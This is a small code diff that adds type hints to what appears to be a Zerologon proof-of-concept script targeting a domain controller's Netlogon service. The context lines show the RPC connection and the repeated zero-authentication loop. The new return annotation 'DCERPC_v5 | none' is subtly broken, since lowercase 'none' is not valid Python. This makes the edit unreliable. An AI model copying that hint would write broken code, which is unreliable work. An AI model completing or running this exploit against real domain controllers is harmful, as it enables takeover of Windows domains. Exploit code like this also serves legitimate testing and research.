@@ -27,7 +27,7 @@ def fail(msg):
     sys.exit(2)
 
 
-def try_zero_authenticate(dc_handle, dc_ip, target_computer):
+def try_zero_authenticate(dc_handle: str, dc_ip: str, target_computer: str) -> DCERPC_v5 | none:
     # Connect to the DC's Netlogon service.
     binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
     rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
@@ -79,7 +79,7 @@ def try_zero_authenticate(dc_handle, dc_ip, target_computer):
         fail(f'Unexpected error: {ex}.')
 
 
-def perform_attack(dc_handle, dc_ip, target_computer):
+def perform_attack(dc_handle: str, dc_ip: str, target_computer: str):
     # Keep authenticating until successful. Expected average number of attempts needed: 256.
     print('Performing authentication attempts...')
     rpc_con = None
